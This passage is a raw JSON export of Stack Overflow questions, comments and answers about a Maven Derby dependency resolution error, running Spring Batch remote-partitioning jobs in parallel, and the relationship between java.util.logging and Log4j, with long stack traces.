appreciated!</p>\n"},{"tags":["java","spring-boot"],"comments":[{"owner":{"account_id":9504657,"reputation":7440,"user_id":7064617,"display_name":"JCompetence"},"score":2,"creation_date":1642494364,"post_id":70752350,"comment_id":125078633,"body_markdown":"Try `mvn clean install -U` and see if that resolves your issue","body":"Try <code>mvn clean install -U</code> and see if that resolves your issue"},{"owner":{"account_id":9504657,"reputation":7440,"user_id":7064617,"display_name":"JCompetence"},"score":1,"creation_date":1642499563,"post_id":70752350,"comment_id":125080727,"body_markdown":"Glad it helped @Ri","body":"Glad it helped @Ri"}],"owner":{"account_id":22104620,"reputation":87,"user_id":16360534,"display_name":"ritu mansata"},"comment_count":2,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":37,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"closed_date":1642494588,"answer_count":0,"score":0,"last_activity_date":1642494215,"creation_date":1642494215,"question_id":70752350,"body_markdown":"    &lt;dependency&gt;\r\n        &lt;groupId&gt;org.apache.derby&lt;/groupId&gt;\r\n        &lt;artifactId&gt;derby&lt;/artifactId&gt;\r\n        &lt;scope&gt;runtime&lt;/scope&gt;\r\n    &lt;/dependency&gt;\r\n\r\n\r\nwhen i add these it gives error like\r\n\r\n    Failure to transfer org.apache.derby:derby:jar:10.14.2.0 from https://repo.maven.apache.org/maven2 was cached in the local repository, resolution will not be \r\n reattempted until the update interval of central has elapsed or updates are forced. Original error: Could not transfer artifact org.apache.derby:derby:jar:10.14.2.0 from/\r\n to central (https://repo.maven.apache.org/maven2): repo.maven.apache.org org.eclipse.aether.transfer.ArtifactTransferException: Failure to transfer \r\n org.apache.derby:derby:jar:10.14.2.0 from https://repo.maven.apache.org/maven2 was cached in the local repository, resolution will not be reattempted until the \r\n update interval of central has elapsed or updates are forced. Original error: Could not transfer artifact org.apache.derby:derby:jar:10.14.2.0 from/to central (https://\r\n repo.maven.apache.org/maven2): repo.maven.apache.org at \r\n org.eclipse.aether.internal.impl.DefaultUpdateCheckManager.newException(DefaultUpdateCheckManager.java:240) at \r\n org.eclipse.aether.internal.impl.DefaultUpdateCheckManager.checkArtifact(DefaultUpdateCheckManager.java:208) at \r\n org.eclipse.aether.internal.impl.DefaultArtifactResolver.gatherDownloads(DefaultArtifactResolver.java:563) at \r\n org.eclipse.aether.internal.impl.DefaultArtifactResolver.performDownloads(DefaultArtifactResolver.java:481) at \r\n org.eclipse.aether.internal.impl.DefaultArtifactResolver.resolve(DefaultArtifactResolver.java:399) at \r\n org.eclipse.aether.internal.impl.DefaultArtifactResolver.resolveArtifacts(DefaultArtifactResolver.java:224) at \r\n org.eclipse.aether.internal.impl.DefaultRepositorySystem.resolveDependencies(DefaultRepositorySystem.java:338) at \r\n org.apache.maven.project.DefaultProjectDependenciesResolver.resolve(DefaultProjectDependenciesResolver.java:202) at \r\n org.apache.maven.project.DefaultProjectBuilder.resolveDependencies(DefaultProjectBuilder.java:212) at \r\n org.apache.maven.project.DefaultProjectBuilder.build(DefaultProjectBuilder.java:185) at org.apache.maven.project.DefaultProjectBuilder.build(DefaultProjectBuilder.java:\r\n 116) at org.eclipse.m2e.core.internal.embedder.MavenImpl.readMavenProject(MavenImpl.java:628) at \r\n org.eclipse.m2e.core.internal.project.registry.DefaultMavenDependencyResolver.resolveProjectDependencies(DefaultMavenDependencyResolver.java:63) at \r\n org.eclipse.m2e.core.internal.project.registry.ProjectRegistryManager.refreshPhase2(ProjectRegistryManager.java:525) at \r\n org.eclipse.m2e.core.internal.project.registry.ProjectRegistryManager.lambda$1(ProjectRegistryManager.java:489) at \r\n org.eclipse.m2e.core.internal.embedder.MavenExecutionContext.executeBare(MavenExecutionContext.java:177) at \r\n org.eclipse.m2e.core.internal.embedder.MavenExecutionContext.execute(MavenExecutionContext.java:151) at \r\n org.eclipse.m2e.core.internal.project.registry.ProjectRegistryManager.refresh(ProjectRegistryManager.java:488) at \r\n org.eclipse.m2e.core.internal.project.registry.ProjectRegistryManager.refresh(ProjectRegistryManager.java:349) at \r\n org.eclipse.m2e.core.internal.project.registry.ProjectRegistryManager.refresh(ProjectRegistryManager.java:296) at \r\n org.eclipse.m2e.core.internal.builder.MavenBuilder$BuildMethod.getProjectFacade(MavenBuilder.java:155) at \r\n org.eclipse.m2e.core.internal.builder.MavenBuilder$BuildMethod$1.call(MavenBuilder.java:90) at \r\n org.eclipse.m2e.core.internal.embedder.MavenExecutionContext.executeBare(MavenExecutionContext.java:177) at \r\n org.eclipse.m2e.core.internal.embedder.MavenExecutionContext.execute(MavenExecutionContext.java:151) at \r\n org.eclipse.m2e.core.internal.embedder.MavenExecutionContext.execute(MavenExecutionContext.java:99) at \r\n org.eclipse.m2e.core.internal.builder.MavenBuilder$BuildMethod.execute(MavenBuilder.java:87) at \r\n org.eclipse.m2e.core.internal.builder.MavenBuilder.build(MavenBuilder.java:201) at org.eclipse.core.internal.events.BuildManager$2.run(BuildManager.java:833) at \r\n org.eclipse.core.runtime.SafeRunner.run(SafeRunner.java:45) at org.eclipse.core.internal.events.BuildManager.basicBuild(BuildManager.java:220) at \r\n org.eclipse.core.internal.events.BuildManager.basicBuild(BuildManager.java:263) at org.eclipse.core.internal.events.BuildManager$1.run(BuildManager.java:316) at \r\n org.eclipse.core.runtime.SafeRunner.run(SafeRunner.java:45) at org.eclipse.core.internal.events.BuildManager.basicBuild(BuildManager.java:319) at \r\n org.eclipse.core.internal.events.BuildManager.basicBuildLoop(BuildManager.java:371) at org.eclipse.core.internal.events.BuildManager.build(BuildManager.java:392) at \r\n org.eclipse.core.internal.events.AutoBuildJob.doBuild(AutoBuildJob.java:154) at org.eclipse.core.internal.events.AutoBuildJob.run(AutoBuildJob.java:244) at \r\n org.eclipse.core.internal.jobs.Worker.run","title":"when i add apache deryby dependecy it gives error","body":"<pre><code>&lt;dependency&gt;\n    &lt;groupId&gt;org.apache.derby&lt;/groupId&gt;\n    &lt;artifactId&gt;derby&lt;/artifactId&gt;\n    &lt;scope&gt;runtime&lt;/scope&gt;\n&lt;/dependency&gt;\n</code></pre>\n<p>when i add these it gives error like</p>\n<pre><code>Failure to transfer org.apache.derby:derby:jar:10.14.2.0 from https://repo.maven.apache.org/maven2 was cached in the local repository, resolution will not be \n</code></pre>\n<p>reattempted until the update interval of central has elapsed or updates are forced. Original error: Could not transfer artifact org.apache.derby:derby:jar:10.14.2.0 from/\nto central (<a href=\"https://repo.maven.apache.org/maven2\" rel=\"nofollow noreferrer\">https://repo.maven.apache.org/maven2</a>): repo.maven.apache.org org.eclipse.aether.transfer.ArtifactTransferException: Failure to transfer\norg.apache.derby:derby:jar:10.14.2.0 from <a href=\"https://repo.maven.apache.org/maven2\" rel=\"nofollow noreferrer\">https://repo.maven.apache.org/maven2</a> was cached in the local repository, resolution will not be reattempted until the\nupdate interval of central has elapsed or updates are forced. Original error: Could not transfer artifact org.apache.derby:derby:jar:10.14.2.0 from/to central (https://\nrepo.maven.apache.org/maven2): repo.maven.apache.org at\norg.eclipse.aether.internal.impl.DefaultUpdateCheckManager.newException(DefaultUpdateCheckManager.java:240) at\norg.eclipse.aether.internal.impl.DefaultUpdateCheckManager.checkArtifact(DefaultUpdateCheckManager.java:208) at\norg.eclipse.aether.internal.impl.DefaultArtifactResolver.gatherDownloads(DefaultArtifactResolver.java:563) at\norg.eclipse.aether.internal.impl.DefaultArtifactResolver.performDownloads(DefaultArtifactResolver.java:481) at\norg.eclipse.aether.internal.impl.DefaultArtifactResolver.resolve(DefaultArtifactResolver.java:399) at\norg.eclipse.aether.internal.impl.DefaultArtifactResolver.resolveArtifacts(DefaultArtifactResolver.java:224) at\norg.eclipse.aether.internal.impl.DefaultRepositorySystem.resolveDependencies(DefaultRepositorySystem.java:338) at\norg.apache.maven.project.DefaultProjectDependenciesResolver.resolve(DefaultProjectDependenciesResolver.java:202) at\norg.apache.maven.project.DefaultProjectBuilder.resolveDependencies(DefaultProjectBuilder.java:212) at\norg.apache.maven.project.DefaultProjectBuilder.build(DefaultProjectBuilder.java:185) at org.apache.maven.project.DefaultProjectBuilder.build(DefaultProjectBuilder.java:\n116) at org.eclipse.m2e.core.internal.embedder.MavenImpl.readMavenProject(MavenImpl.java:628) at\norg.eclipse.m2e.core.internal.project.registry.DefaultMavenDependencyResolver.resolveProjectDependencies(DefaultMavenDependencyResolver.java:63) at\norg.eclipse.m2e.core.internal.project.registry.ProjectRegistryManager.refreshPhase2(ProjectRegistryManager.java:525) at\norg.eclipse.m2e.core.internal.project.registry.ProjectRegistryManager.lambda$1(ProjectRegistryManager.java:489) at\norg.eclipse.m2e.core.internal.embedder.MavenExecutionContext.executeBare(MavenExecutionContext.java:177) at\norg.eclipse.m2e.core.internal.embedder.MavenExecutionContext.execute(MavenExecutionContext.java:151) at\norg.eclipse.m2e.core.internal.project.registry.ProjectRegistryManager.refresh(ProjectRegistryManager.java:488) at\norg.eclipse.m2e.core.internal.project.registry.ProjectRegistryManager.refresh(ProjectRegistryManager.java:349) at\norg.eclipse.m2e.core.internal.project.registry.ProjectRegistryManager.refresh(ProjectRegistryManager.java:296) at\norg.eclipse.m2e.core.internal.builder.MavenBuilder$BuildMethod.getProjectFacade(MavenBuilder.java:155) at\norg.eclipse.m2e.core.internal.builder.MavenBuilder$BuildMethod$1.call(MavenBuilder.java:90) at\norg.eclipse.m2e.core.internal.embedder.MavenExecutionContext.executeBare(MavenExecutionContext.java:177) at\norg.eclipse.m2e.core.internal.embedder.MavenExecutionContext.execute(MavenExecutionContext.java:151) at\norg.eclipse.m2e.core.internal.embedder.MavenExecutionContext.execute(MavenExecutionContext.java:99) at\norg.eclipse.m2e.core.internal.builder.MavenBuilder$BuildMethod.execute(MavenBuilder.java:87) at\norg.eclipse.m2e.core.internal.builder.MavenBuilder.build(MavenBuilder.java:201) at org.eclipse.core.internal.events.BuildManager$2.run(BuildManager.java:833) at\norg.eclipse.core.runtime.SafeRunner.run(SafeRunner.java:45) at org.eclipse.core.internal.events.BuildManager.basicBuild(BuildManager.java:220) at\norg.eclipse.core.internal.events.BuildManager.basicBuild(BuildManager.java:263) at org.eclipse.core.internal.events.BuildManager$1.run(BuildManager.java:316) at\norg.eclipse.core.runtime.SafeRunner.run(SafeRunner.java:45) at org.eclipse.core.internal.events.BuildManager.basicBuild(BuildManager.java:319) at\norg.eclipse.core.internal.events.BuildManager.basicBuildLoop(BuildManager.java:371) at org.eclipse.core.internal.events.BuildManager.build(BuildManager.java:392) at\norg.eclipse.core.internal.events.AutoBuildJob.doBuild(AutoBuildJob.java:154) at org.eclipse.core.internal.events.AutoBuildJob.run(AutoBuildJob.java:244) at\norg.eclipse.core.internal.jobs.Worker.run</p>\n"},{"tags":["java","spring-batch","spring-integration","spring-batch-integration"],"answers":[{"tags":[],"owner":{"account_id":6482932,"reputation":29552,"user_id":5019386,"display_name":"Mahmoud Ben Hassine"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1625654251,"creation_date":1625654251,"answer_id":68284428,"question_id":68284118,"body_markdown":"In such a setup, the `MessageChannelPartitionHandler` should be step-scoped. There is a note about that in the Javadoc:\r\n\r\n```\r\nNote: The reply channel for this is instance based.\r\nSharing this component across multiple step instances may result in the\r\ncrossing of messages. It&#39;s recommended that this component be step or job scoped.\r\n```\r\n\r\nMaking this bean step-scoped should fix the issue.","title":"Spring batch integration remote partitioning - running parallel jobs","body":"<p>In such a setup, the <code>MessageChannelPartitionHandler</code> should be step-scoped. There is a note about that in the Javadoc:</p>\n<pre><code>Note: The reply channel for this is instance based.\nSharing this component across multiple step instances may result in the\ncrossing of messages. It's recommended that this component be step or job scoped.\n</code></pre>\n<p>Making this bean step-scoped should fix the issue.</p>\n"}],"owner":{"account_id":1552524,"reputation":46,"user_id":1444593,"display_name":"GauravKumar"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":458,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":1,"score":0,"last_activity_date":1642493932,"creation_date":1625653016,"question_id":68284118,"body_markdown":"We have a usecase where we need to read data from some paginated API and write to some downstream Kafka topic.\r\n\r\nWe have been able to implement the solution via **spring batch integration remote partitioning** where the manager takes care of partitioning the task by creating executionContext which containes the page number and offset to read data for. The manager creates this executionContext and puts them on the messagingChannel(I can use rabbitMQ and Kafka topic whichever provides a solution). The workers(more than 1) pick that executionContext from the messagingChannel and complete the task of reading the data from the API and writing it to the required Kafka topic.\r\n\r\nThe above implementation works just fine. This also works fine if I run the same job for different clients one after another. The challenge comes when we want to **run the same job for multiple clients in parallel**. \r\nFor example, we launch the jobs for 2 clients in parallel. It creates 1 manager and 2 workers for each client. Now the issue comes when both of the managers pushed the executionContext on the **same messagingChannel** and workers don&#39;t know which one to pick and execute. \r\nAlso, both the jobs share the **same database spring batch tables**, so I suspect it would create problems at that level as well.\r\n\r\nAny input or references on how to implement running multiple spring batch reporter partitioning jobs in parallel.\r\n\r\n**Update[18 Jan 2022]**\r\n\r\nI tried adding @StepScoped to MessageChannelPartitionHandler at [here][1] and below is the error I am getting:\r\n\r\n    org.springframework.beans.factory.BeanCreationException: Error creating bean with name &#39;partitioningMessageHandler&#39;: FactoryBean threw exception on object creation; nested exception is java.lang.IllegalStateException: Target object of type [class com.sun.proxy.$Proxy78] has no eligible methods for handling Messages.\r\n\tat org.springframework.beans.factory.support.FactoryBeanRegistrySupport.doGetObjectFromFactoryBean(FactoryBeanRegistrySupport.java:178) ~[spring-beans-5.2.6.RELEASE.jar:5.2.6.RELEASE]\r\n\tat org.springframework.beans.factory.support.FactoryBeanRegistrySupport.getObjectFromFactoryBean(FactoryBeanRegistrySupport.java:101) ~[spring-beans-5.2.6.RELEASE.jar:5.2.6.RELEASE]\r\n\tat org.springframework.beans.factory.support.AbstractBeanFactory.getObjectForBeanInstance(AbstractBeanFactory.java:1821) ~[spring-beans-5.2.6.RELEASE.jar:5.2.6.RELEASE]\r\n\tat org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.getObjectForBeanInstance(AbstractAutowireCapableBeanFactory.java:1266) ~[spring-beans-5.2.6.RELEASE.jar:5.2.6.RELEASE]\r\n\tat org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:333) ~[spring-beans-5.2.6.RELEASE.jar:5.2.6.RELEASE]\r\n\tat org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:202) ~[spring-beans-5.2.6.RELEASE.jar:5.2.6.RELEASE]\r\n\tat org.springframework.integration.config.annotation.AbstractMethodAnnotationPostProcessor.resolveTargetBeanFromMethodWithBeanAnnotation(AbstractMethodAnnotationPostProcessor.java:536) ~[spring-integration-core-5.3.1.RELEASE.jar:5.3.1.RELEASE]\r\n\tat org.springframework.integration.config.annotation.AbstractMethodAnnotationPostProcessor.postProcess(AbstractMethodAnnotationPostProcessor.java:154) ~[spring-integration-core-5.3.1.RELEASE.jar:5.3.1.RELEASE]\r\n\tat org.springframework.integration.config.annotation.MessagingAnnotationPostProcessor.postProcessMethodAndRegisterEndpointIfAny(MessagingAnnotationPostProcessor.java:230) ~[spring-integration-core-5.3.1.RELEASE.jar:5.3.1.RELEASE]\r\n\tat org.springframework.integration.config.annotation.MessagingAnnotationPostProcessor.lambda$processAnnotationTypeOnMethod$1(MessagingAnnotationPostProcessor.java:220) ~[spring-integration-core-5.3.1.RELEASE.jar:5.3.1.RELEASE]\r\n\tat java.base/java.util.ArrayList.forEach(ArrayList.java:1540) ~[na:na]\r\n\tat org.springframework.integration.config.annotation.MessagingAnnotationPostProcessor.afterSingletonsInstantiated(MessagingAnnotationPostProcessor.java:141) ~[spring-integration-core-5.3.1.RELEASE.jar:5.3.1.RELEASE]\r\n\tat org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:912) ~[spring-beans-5.2.6.RELEASE.jar:5.2.6.RELEASE]\r\n\tat org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:878) ~[spring-context-5.2.6.RELEASE.jar:5.2.6.RELEASE]\r\n\tat org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:550) ~[spring-context-5.2.6.RELEASE.jar:5.2.6.RELEASE]\r\n\tat org.springframework.boot.SpringApplication.refresh(SpringApplication.java:747) ~[spring-boot-2.2.7.RELEASE.jar:2.2.7.RELEASE]\r\n\tat org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:397) ~[spring-boot-2.2.7.RELEASE.jar:2.2.7.RELEASE]\r\n\tat org.springframework.boot.SpringApplication.run(SpringApplication.java:315) ~[spring-boot-2.2.7.RELEASE.jar:2.2.7.RELEASE]\r\n\tat org.springframework.boot.SpringApplication.run(SpringApplication.java:1226) ~[spring-boot-2.2.7.RELEASE.jar:2.2.7.RELEASE]\r\n\tat org.springframework.boot.SpringApplication.run(SpringApplication.java:1215) ~[spring-boot-2.2.7.RELEASE.jar:2.2.7.RELEASE]\r\n\tat spring.batch.integration.Manager.main(Manager.java:11) ~[main/:na]\r\n    Caused by: java.lang.IllegalStateException: Target object of type [class com.sun.proxy.$Proxy78] has no eligible methods for handling Messages.\r\n    \tat org.springframework.util.Assert.state(Assert.java:94) ~[spring-core-5.2.6.RELEASE.jar:5.2.6.RELEASE]\r\n    \tat org.springframework.integration.handler.support.MessagingMethodInvokerHelper.validateFallbackMethods(MessagingMethodInvokerHelper.java:751) ~[spring-integration-core-5.3.1.RELEASE.jar:5.3.1.RELEASE]\r\n    \tat org.springframework.integration.handler.support.MessagingMethodInvokerHelper.findHandlerMethodsForTarget(MessagingMethodInvokerHelper.java:740) ~[spring-integration-core-5.3.1.RELEASE.jar:5.3.1.RELEASE]\r\n    \tat org.springframework.integration.handler.support.MessagingMethodInvokerHelper.&lt;init&gt;(MessagingMethodInvokerHelper.java:294) ~[spring-integration-core-5.3.1.RELEASE.jar:5.3.1.RELEASE]\r\n    \tat org.springframework.integration.handler.support.MessagingMethodInvokerHelper.&lt;init&gt;(MessagingMethodInvokerHelper.java:231) ~[spring-integration-core-5.3.1.RELEASE.jar:5.3.1.RELEASE]\r\n    \tat org.springframework.integration.aggregator.MethodInvokingMessageListProcessor.&lt;init&gt;(MethodInvokingMessageListProcessor.java:63) ~[spring-integration-core-5.3.1.RELEASE.jar:5.3.1.RELEASE]\r\n    \tat org.springframework.integration.aggregator.MethodInvokingMessageGroupProcessor.&lt;init&gt;(MethodInvokingMessageGroupProcessor.java:53) ~[spring-integration-core-5.3.1.RELEASE.jar:5.3.1.RELEASE]\r\n    \tat org.springframework.integration.config.AggregatorFactoryBean.createHandler(AggregatorFactoryBean.java:211) ~[spring-integration-core-5.3.1.RELEASE.jar:5.3.1.RELEASE]\r\n    \tat org.springframework.integration.config.AggregatorFactoryBean.createHandler(AggregatorFactoryBean.java:53) ~[spring-integration-core-5.3.1.RELEASE.jar:5.3.1.RELEASE]\r\n    \tat org.springframework.integration.config.AbstractSimpleMessageHandlerFactoryBean.createHandlerInternal(AbstractSimpleMessageHandlerFactoryBean.java:198) ~[spring-integration-core-5.3.1.RELEASE.jar:5.3.1.RELEASE]\r\n    \tat org.springframework.integration.config.AbstractSimpleMessageHandlerFactoryBean.getObject(AbstractSimpleMessageHandlerFactoryBean.java:186) ~[spring-integration-core-5.3.1.RELEASE.jar:5.3.1.RELEASE]\r\n    \tat org.springframework.integration.config.AbstractSimpleMessageHandlerFactoryBean.getObject(AbstractSimpleMessageHandlerFactoryBean.java:60) ~[spring-integration-core-5.3.1.RELEASE.jar:5.3.1.RELEASE]\r\n    \tat org.springframework.beans.factory.support.FactoryBeanRegistrySupport.doGetObjectFromFactoryBean(FactoryBeanRegistrySupport.java:171) ~[spring-beans-5.2.6.RELEASE.jar:5.2.6.RELEASE]\r\n    \t... 20 common frames omitted\r\n\r\n\r\n  [1]: https://github.com/gkumarpatel/spring-batch-parallel-jobs/blob/master/spring-batch-parallel-jobs/manager/src/main/java/spring/batch/integration/configuration/ManagerConfiguration.java","title":"Spring batch integration remote partitioning - running parallel jobs","body":"<p>We have a usecase where we need to read data from some paginated API and write to some downstream Kafka topic.</p>\n<p>We have been able to implement the solution via <strong>spring batch integration remote partitioning</strong> where the manager takes care of partitioning the task by creating executionContext which containes the page number and offset to read data for. The manager creates this executionContext and puts them on the messagingChannel(I can use rabbitMQ and Kafka topic whichever provides a solution). The workers(more than 1) pick that executionContext from the messagingChannel and complete the task of reading the data from the API and writing it to the required Kafka topic.</p>\n<p>The above implementation works just fine. This also works fine if I run the same job for different clients one after another. The challenge comes when we want to <strong>run the same job for multiple clients in parallel</strong>.\nFor example, we launch the jobs for 2 clients in parallel. It creates 1 manager and 2 workers for each client. Now the issue comes when both of the managers pushed the executionContext on the <strong>same messagingChannel</strong> and workers don't know which one to pick and execute.\nAlso, both the jobs share the <strong>same database spring batch tables</strong>, so I suspect it would create problems at that level as well.</p>\n<p>Any input or references on how to implement running multiple spring batch reporter partitioning jobs in parallel.</p>\n<p><strong>Update[18 Jan 2022]</strong></p>\n<p>I tried adding @StepScoped to MessageChannelPartitionHandler at <a href=\"https://github.com/gkumarpatel/spring-batch-parallel-jobs/blob/master/spring-batch-parallel-jobs/manager/src/main/java/spring/batch/integration/configuration/ManagerConfiguration.java\" rel=\"nofollow noreferrer\">here</a> and below is the error I am getting:</p>\n<pre><code>org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'partitioningMessageHandler': FactoryBean threw exception on object creation; nested exception is java.lang.IllegalStateException: Target object of type [class com.sun.proxy.$Proxy78] has no eligible methods for handling Messages.\nat org.springframework.beans.factory.support.FactoryBeanRegistrySupport.doGetObjectFromFactoryBean(FactoryBeanRegistrySupport.java:178) ~[spring-beans-5.2.6.RELEASE.jar:5.2.6.RELEASE]\nat org.springframework.beans.factory.support.FactoryBeanRegistrySupport.getObjectFromFactoryBean(FactoryBeanRegistrySupport.java:101) ~[spring-beans-5.2.6.RELEASE.jar:5.2.6.RELEASE]\nat org.springframework.beans.factory.support.AbstractBeanFactory.getObjectForBeanInstance(AbstractBeanFactory.java:1821) ~[spring-beans-5.2.6.RELEASE.jar:5.2.6.RELEASE]\nat org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.getObjectForBeanInstance(AbstractAutowireCapableBeanFactory.java:1266) ~[spring-beans-5.2.6.RELEASE.jar:5.2.6.RELEASE]\nat org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:333) ~[spring-beans-5.2.6.RELEASE.jar:5.2.6.RELEASE]\nat org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:202) ~[spring-beans-5.2.6.RELEASE.jar:5.2.6.RELEASE]\nat org.springframework.integration.config.annotation.AbstractMethodAnnotationPostProcessor.resolveTargetBeanFromMethodWithBeanAnnotation(AbstractMethodAnnotationPostProcessor.java:536) ~[spring-integration-core-5.3.1.RELEASE.jar:5.3.1.RELEASE]\nat org.springframework.integration.config.annotation.AbstractMethodAnnotationPostProcessor.postProcess(AbstractMethodAnnotationPostProcessor.java:154) ~[spring-integration-core-5.3.1.RELEASE.jar:5.3.1.RELEASE]\nat org.springframework.integration.config.annotation.MessagingAnnotationPostProcessor.postProcessMethodAndRegisterEndpointIfAny(MessagingAnnotationPostProcessor.java:230) ~[spring-integration-core-5.3.1.RELEASE.jar:5.3.1.RELEASE]\nat org.springframework.integration.config.annotation.MessagingAnnotationPostProcessor.lambda$processAnnotationTypeOnMethod$1(MessagingAnnotationPostProcessor.java:220) ~[spring-integration-core-5.3.1.RELEASE.jar:5.3.1.RELEASE]\nat java.base/java.util.ArrayList.forEach(ArrayList.java:1540) ~[na:na]\nat org.springframework.integration.config.annotation.MessagingAnnotationPostProcessor.afterSingletonsInstantiated(MessagingAnnotationPostProcessor.java:141) ~[spring-integration-core-5.3.1.RELEASE.jar:5.3.1.RELEASE]\nat org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:912) ~[spring-beans-5.2.6.RELEASE.jar:5.2.6.RELEASE]\nat org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:878) ~[spring-context-5.2.6.RELEASE.jar:5.2.6.RELEASE]\nat org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:550) ~[spring-context-5.2.6.RELEASE.jar:5.2.6.RELEASE]\nat org.springframework.boot.SpringApplication.refresh(SpringApplication.java:747) ~[spring-boot-2.2.7.RELEASE.jar:2.2.7.RELEASE]\nat org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:397) ~[spring-boot-2.2.7.RELEASE.jar:2.2.7.RELEASE]\nat org.springframework.boot.SpringApplication.run(SpringApplication.java:315) ~[spring-boot-2.2.7.RELEASE.jar:2.2.7.RELEASE]\nat org.springframework.boot.SpringApplication.run(SpringApplication.java:1226) ~[spring-boot-2.2.7.RELEASE.jar:2.2.7.RELEASE]\nat org.springframework.boot.SpringApplication.run(SpringApplication.java:1215) ~[spring-boot-2.2.7.RELEASE.jar:2.2.7.RELEASE]\nat spring.batch.integration.Manager.main(Manager.java:11) ~[main/:na]\nCaused by: java.lang.IllegalStateException: Target object of type [class com.sun.proxy.$Proxy78] has no eligible methods for handling Messages.\n    at org.springframework.util.Assert.state(Assert.java:94) ~[spring-core-5.2.6.RELEASE.jar:5.2.6.RELEASE]\n    at org.springframework.integration.handler.support.MessagingMethodInvokerHelper.validateFallbackMethods(MessagingMethodInvokerHelper.java:751) ~[spring-integration-core-5.3.1.RELEASE.jar:5.3.1.RELEASE]\n    at org.springframework.integration.handler.support.MessagingMethodInvokerHelper.findHandlerMethodsForTarget(MessagingMethodInvokerHelper.java:740) ~[spring-integration-core-5.3.1.RELEASE.jar:5.3.1.RELEASE]\n    at org.springframework.integration.handler.support.MessagingMethodInvokerHelper.&lt;init&gt;(MessagingMethodInvokerHelper.java:294) ~[spring-integration-core-5.3.1.RELEASE.jar:5.3.1.RELEASE]\n    at org.springframework.integration.handler.support.MessagingMethodInvokerHelper.&lt;init&gt;(MessagingMethodInvokerHelper.java:231) ~[spring-integration-core-5.3.1.RELEASE.jar:5.3.1.RELEASE]\n    at org.springframework.integration.aggregator.MethodInvokingMessageListProcessor.&lt;init&gt;(MethodInvokingMessageListProcessor.java:63) ~[spring-integration-core-5.3.1.RELEASE.jar:5.3.1.RELEASE]\n    at org.springframework.integration.aggregator.MethodInvokingMessageGroupProcessor.&lt;init&gt;(MethodInvokingMessageGroupProcessor.java:53) ~[spring-integration-core-5.3.1.RELEASE.jar:5.3.1.RELEASE]\n    at org.springframework.integration.config.AggregatorFactoryBean.createHandler(AggregatorFactoryBean.java:211) ~[spring-integration-core-5.3.1.RELEASE.jar:5.3.1.RELEASE]\n    at org.springframework.integration.config.AggregatorFactoryBean.createHandler(AggregatorFactoryBean.java:53) ~[spring-integration-core-5.3.1.RELEASE.jar:5.3.1.RELEASE]\n    at org.springframework.integration.config.AbstractSimpleMessageHandlerFactoryBean.createHandlerInternal(AbstractSimpleMessageHandlerFactoryBean.java:198) ~[spring-integration-core-5.3.1.RELEASE.jar:5.3.1.RELEASE]\n    at org.springframework.integration.config.AbstractSimpleMessageHandlerFactoryBean.getObject(AbstractSimpleMessageHandlerFactoryBean.java:186) ~[spring-integration-core-5.3.1.RELEASE.jar:5.3.1.RELEASE]\n    at org.springframework.integration.config.AbstractSimpleMessageHandlerFactoryBean.getObject(AbstractSimpleMessageHandlerFactoryBean.java:60) ~[spring-integration-core-5.3.1.RELEASE.jar:5.3.1.RELEASE]\n    at org.springframework.beans.factory.support.FactoryBeanRegistrySupport.doGetObjectFromFactoryBean(FactoryBeanRegistrySupport.java:171) ~[spring-beans-5.2.6.RELEASE.jar:5.2.6.RELEASE]\n    ... 20 common frames omitted\n</code></pre>\n"},{"tags":["java","spring","log4j","log4j2","java.util.logging"],"comments":[{"owner":{"account_id":3192259,"reputation":117609,"user_id":2696260,"display_name":"M. Deinum"},"score":2,"creation_date":1642493832,"post_id":70752257,"comment_id":125078444,"body_markdown":"What makes you think `java.util.logging.Logger` is log4j at all? It is the standard logger shipped with java.","body":"What makes you think <code>java.util.logging.Logger</code> is log4j at all? It is the standard logger shipped with java."},{"owner":{"account_id":13266324,"reputation":169,"user_id":12893352,"display_name":"Illidan"},"score":0,"creation_date":1642494726,"post_id":70752257,"comment_id":125078761,"body_markdown":"that&#39;s the problem, I don&#39;t understand what the relationship is.","body":"that&#39;s the problem, I don&#39;t understand what the relationship is."},{"owner":{"account_id":3192259,"reputation":117609,"user_id":2696260,"display_name":"M. Deinum"},"score":0,"creation_date":1642495114,"post_id":70752257,"comment_id":125078929,"body_markdown":"There is no relationship. If you want to use Log4j2 with JUL (Java Util Loggin) see https://stackoverflow.com/questions/21781026/how-to-send-java-util-logging-to-log4j2","body":"There is no relationship. If you want to use Log4j2 with JUL (Java Util Loggin) see <a href=\"https://stackoverflow.com/questions/21781026/how-to-send-java-util-logging-to-log4j2\" title=\"how to send java util logging to log4j2\">stackoverflow.com/questions/21781026/&hellip;</a>"},{"owner":{"account_id":16269349,"reputation":13452,"user_id":11748454,"display_name":"Piotr P. Karwasz"},"score":0,"creation_date":1642498858,"post_id":70752257,"comment_id":125080421,"body_markdown":"Spring Boot bridges binds all major logging frameworks to a single backend (see [logging documentation](https://docs.spring.io/spring-boot/docs/current/reference/html/features.html#features.logging)). You shouldn&#39;t add Log4j 1.x or Log4j 2.x Core to your classpath, unless you know what you are doing.","body":"Spring Boot bridges binds all major logging frameworks to a single backend (see <a href=\"https://docs.spring.io/spring-boot/docs/current/reference/html/features.html#features.logging\" rel=\"nofollow 